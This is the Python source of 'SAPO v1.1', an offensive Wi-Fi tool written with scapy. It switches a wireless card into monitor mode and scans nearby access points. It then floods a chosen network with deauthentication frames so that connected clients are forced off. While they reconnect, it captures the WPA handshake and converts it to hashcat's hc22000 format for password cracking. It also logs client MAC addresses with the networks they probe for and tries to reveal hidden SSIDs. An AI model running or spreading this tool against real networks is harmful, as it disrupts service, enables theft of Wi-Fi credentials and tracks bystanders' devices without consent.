import os
import threading
import time
import signal
import sys
import re
from scapy.all import *

C_WHITE = '\033[97m'; C_GREEN = '\033[92m'; C_YELLOW = '\033[93m'; C_RED = '\033[91m'; C_BLUE = '\033[94m'; C_END = '\033[0m'; C_BOLD = '\033[1m'
MIN_HITS_DISPLAY = 7 
LIVE_MIN_HITS = 3    

stop_attack_event = threading.Event()
handshake_captured = False
handshake_packets = []
target_iface = None
networks = {} 
intel_map = {} 
live_clients = {} 
hidden_bssids_cache = set()
temporal_events = [] 
match_scoring = {}   

def restore_network():
    """Safely reverts the interface to its original state"""
    global target_iface
    if target_iface:
        print(f"\n{C_YELLOW}[!] Restoring {target_iface} to managed mode...{C_END}")
        os.system(f"sudo ip link set {target_iface} down 2>/dev/null")
        os.system(f"sudo iw dev {target_iface} set type managed 2>/dev/null")
        os.system(f"sudo ip link set {target_iface} up 2>/dev/null")
        print(f"{C_GREEN}[+] Interface restored. SAPO closed.{C_END}")
        target_iface = None

def signal_handler(sig, frame):
    restore_network()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTSTP, signal_handler)

def ljust_ansi(text, width):
    clean_text = re.sub(r'\033\[[0-9;]*m', '', str(text))
    return text + (" " * (width - len(clean_text)))

def get_pwr_color(dbm):
    if dbm >= -60: return f"{C_GREEN}{dbm}{C_END}"
    if dbm >= -80: return f"{C_YELLOW}{dbm}{C_END}"
    return f"{C_RED}{dbm}{C_END}"

def get_encryption(pkt):
    if not pkt.haslayer(Dot11Beacon): return "???"
    try:
        p = pkt[Dot11Elt]
        while isinstance(p, Dot11Elt):
            if p.ID == 48: return "WPA2"
            if p.ID == 221 and p.info.startswith(b'\x00P\xf2\x01\x01\x00'): return "WPA"
            p = p.payload
        if not (pkt[Dot11Beacon].cap & 0x0001): return "OPN"
        return "WPA*"
    except: return "???"

def packet_handler(pkt):
    global networks, intel_map, temporal_events, match_scoring
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        bssid = pkt[Dot11].addr3
        dbm = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
        essid = ""; is_hidden = False
        if pkt.haslayer(Dot11Elt):
            info = pkt[Dot11Elt].info
            if pkt.haslayer(Dot11ProbeResp) and info and not all(c == 0 for c in info):
                try: 
                    resolved = info.decode('utf-8', 'ignore')
                    if bssid in hidden_bssids_cache and len(resolved) > 0:
                        match_scoring.setdefault(bssid, {})[resolved] = match_scoring.get(bssid, {}).get(resolved, 0) + 100
                except: pass
            if not info or all(c == 0 for c in info) or b'\x00' in info:
                is_hidden = True
                hidden_bssids_cache.add(bssid)
            else:
                try: essid = info.decode('utf-8', 'ignore')
                except: pass
        channel = 0
        if pkt.haslayer(Dot11EltDSSSet): channel = pkt[Dot11EltDSSSet].channel
        if bssid not in networks:
            networks[bssid] = {'ssid': essid, 'ch': channel, 'dbm': dbm, 'enc': get_encryption(pkt), 'init_hidden': is_hidden, 'clients': set()}
        else:
            networks[bssid].update({'dbm': dbm, 'ch': channel if channel != 0 else networks[bssid]['ch']})

    if pkt.haslayer(Dot11):
        addr1, addr2, addr3 = pkt.addr1, pkt.addr2, pkt.addr3
        for b in [addr1, addr2, addr3]:
            if b in networks:
                client = addr2 if b == addr1 else addr1
                if client and client not in ["ff:ff:ff:ff:ff:ff", b] and not client.startswith("01:00:5e"):
                    networks[b]['clients'].add(client)
        if pkt.haslayer(Dot11ProbeReq):
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', 'ignore')
                if len(ssid) > 1:
                    intel_map[(pkt.addr2, ssid)] = intel_map.get((pkt.addr2, ssid), 0) + 1
                    temporal_events.append((time.time(), ssid))
                    if len(temporal_events) > 500: temporal_events.pop(0)
            except: pass

def print_banner():
    os.system('clear')
    print(f"""{C_GREEN}
╔═══════════════════════════════════════════════════╗
        @..@                      
      (-----)    {C_WHITE}SAPO v1.1 - Beyond Deauthentication{C_GREEN}     
     ( >__< )       {C_WHITE}by Fabián Rosales {C_BLUE}@far00t01{C_GREEN} 
     ^^ ~~ ^^                               
╚═══════════════════════════════════════════════════╝{C_END}""")

def main():
    global target_iface, networks, handshake_captured, intel_map, handshake_packets, stop_attack_event, live_clients
    try:
        while True:
            print_banner()
            ifaces = [i for i in os.listdir('/sys/class/net/') if i != 'lo']
            for i, iface in enumerate(ifaces): print(f" [{i}] {iface}")
            choice = input(f"\nSelect Interface (q: Quit): ").lower().strip()
            if choice in ['q', 'quit']: return
            if choice.isdigit() and int(choice) < len(ifaces):
                target_iface = ifaces[int(choice)]
                break
        
        os.system(f"sudo ip link set {target_iface} down && sudo iw dev {target_iface} set type monitor && sudo ip link set {target_iface} up")

        while True: 
            networks.clear()
            for sec_left in range(20, 0, -1): 
                sniff(iface=target_iface, prn=packet_handler, timeout=1, store=0)
                os.system(f"iw dev {target_iface} set channel {(sec_left % 13) + 1} 2>/dev/null")
                print_banner()
                print(f"{C_YELLOW}[*] Deep Scanning... {sec_left}s{C_END}\n")
                
                header = (ljust_ansi("ID", 5) + ljust_ansi("BSSID", 20) + 
                         ljust_ansi("PWR", 8) + ljust_ansi("CH", 5) + 
                         ljust_ansi("CLI", 5) + "SSID")
                print(header)
                print("-" * 55)
                
                sorted_nets = sorted(networks.items(), key=lambda x: x[1]['dbm'], reverse=True)
                for i, (bssid, info) in enumerate(sorted_nets):
                    pwr_display = get_pwr_color(info['dbm'])
                    cli_count = len(info['clients'])
                    cli_disp = f"{C_BOLD}{cli_count}{C_END}" if cli_count > 0 else "0"
                    ssid_disp = f"{C_RED}[HIDDEN]{C_END}" if info['init_hidden'] else info['ssid']
                    
                    print(ljust_ansi(f"[{i}]", 5) + ljust_ansi(bssid, 20) + 
                          ljust_ansi(pwr_display, 8) + ljust_ansi(str(info['ch']), 5) + 
                          ljust_ansi(cli_disp, 5) + ssid_disp)
            
            cmd = input(f"\nTarget ID (r: Rescan / q: Quit): ").lower().strip()
            if cmd == 'q': break
            if cmd == 'r' or not cmd.isdigit(): continue
            
            selected_bssid = sorted_nets[int(cmd)][0]
            t_data = networks[selected_bssid].copy()
            target_ssid = t_data['ssid']
            
            stop_attack_event.clear(); handshake_captured = False; handshake_packets = []; live_clients.clear()
            target_label = target_ssid if not t_data['init_hidden'] else f"HIDDEN_{selected_bssid.replace(':', '')}"
            folder_name = f"{target_label}-result"
            if not os.path.exists(folder_name): os.makedirs(folder_name)
            
            threading.Thread(target=lambda: deauth_loop(selected_bssid, t_data['ch']), daemon=True).start()
            
            for sec in range(60, 0, -1):
                sniff(iface=target_iface, prn=lambda pkt: process_attack(pkt, t_data, selected_bssid), timeout=1, store=0)
                print_banner()
                print(f"{C_RED}[!] ATTACKING: {target_label} ({selected_bssid}){C_END}")
                hs_col = C_GREEN if handshake_captured else C_WHITE
                print(f"Time: {sec}s | Handshake: {hs_col}{'CAPTURED' if handshake_captured else '...'}{C_END}\n")
                
                print(f"{C_BOLD}DEAUTHENTICATION CLIENTS...{C_END}")
                if live_clients:
                    top_clients = sorted(live_clients.items(), key=lambda x: x[1], reverse=True)[:5]
                    print(f"{C_RED}{' > '.join([c[0] for c in top_clients])}{C_END}")
                else: print("Searching for clients...")
                print("-" * 55)
                
                print(f"\n{C_BOLD}PNL DISCOVERY{C_END}")
                for (mac, ssid), count in sorted(intel_map.items(), key=lambda x: x[1], reverse=True):
                    if ssid != target_ssid and count >= LIVE_MIN_HITS:
                        print(ljust_ansi(mac, 20) + ljust_ansi(C_BLUE + ssid + C_END, 25) + str(count))

            stop_attack_event.set()
            if handshake_packets:
                wrpcap(f"{folder_name}/handshake.pcap", handshake_packets)
                if handshake_captured:
                    os.system(f"hcxpcapngtool -o {folder_name}/handshake.hc22000 {folder_name}/handshake.pcap > /dev/null 2>&1")

            print_banner()
            print(f"BSSID: {selected_bssid} | HANDSHAKE: {C_GREEN if handshake_captured else C_RED}{'CAPTURED' if handshake_captured else 'NO'}{C_END}")
            print(f"FILES STORED IN: {folder_name}/\n")
            
            with open(f"{folder_name}/pnl-discovery.txt", "w") as f:
                f.write(f"SAPO V1.1 - PNL DISCOVERY LOG\nTARGET: {target_label} ({selected_bssid})\n")
                f.write("-" * 60 + "\n")
                f.write(f"{'CLIENT MAC':<20} {'PROBED SSID':<30} {'HITS':<5}\n")
                for (mac, ssid), count in sorted(intel_map.items(), key=lambda x: x[1], reverse=True):
                    if ssid != target_ssid:
                        f.write(f"{mac:<20} {ssid:<30} {count:<5}\n")

            print(f"--- CORRELATION & DISCOVERY (Final Validation) ---")
            assigned_ssids = {} 
            for b_mac, scores in match_scoring.items():
                if b_mac in hidden_bssids_cache and scores:
                    best_s = max(scores, key=scores.get)
                    score_val = scores[best_s]
                    if best_s not in assigned_ssids or score_val > assigned_ssids[best_s][1]:
                        assigned_ssids[best_s] = (b_mac, score_val)

            for ssid, (b_mac, score) in assigned_ssids.items():
                if score > 5 and ssid != target_ssid:
                    print(f"{C_GREEN}[!] HIDDEN  ({b_mac}): {ssid}{C_END}")

            print(f"\n--- PASSIVE NETWORK LIST (Min {MIN_HITS_DISPLAY} Hits) ---")
            for (mac, ssid), count in sorted(intel_map.items(), key=lambda x: x[1], reverse=True):
                if count >= MIN_HITS_DISPLAY and ssid != target_ssid:
                    print(f"{C_YELLOW}[?] CLIENT: {mac} -> {ssid} ({count} hits){C_END}")

            ans = input(f"\n(r: Rescan / q: Quit): ").lower().strip()
            if ans != 'r': return
    finally:
        restore_network()

def deauth_loop(bssid, ch):
    if ch == 0: ch = 1
    pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    while not stop_attack_event.is_set():
        os.system(f"iw dev {target_iface} set channel {ch} 2>/dev/null")
        sendp(pkt, iface=target_iface, count=64, verbose=False, inter=0.001)
        time.sleep(0.1)

def process_attack(pkt, t_data, t_bssid):
    global handshake_captured, handshake_packets, live_clients
    if pkt.haslayer(Dot11):
        packet_handler(pkt)
        if pkt.addr1 == t_bssid or pkt.addr2 == t_bssid:
            c_mac = pkt.addr2 if pkt.addr1 == t_bssid else pkt.addr1
            if c_mac and c_mac != "ff:ff:ff:ff:ff:ff" and c_mac != t_bssid:
                live_clients[c_mac] = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else 0
        if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt.addr3 == t_bssid:
            if not any(p.haslayer(Dot11Beacon) for p in handshake_packets):
                handshake_packets.append(pkt)
        if pkt.haslayer(EAPOL) and (pkt.addr1 == t_bssid or pkt.addr2 == t_bssid or pkt.addr3 == t_bssid): 
            handshake_captured = True
            handshake_packets.append(pkt)

if __name__ == "__main__":
    main()
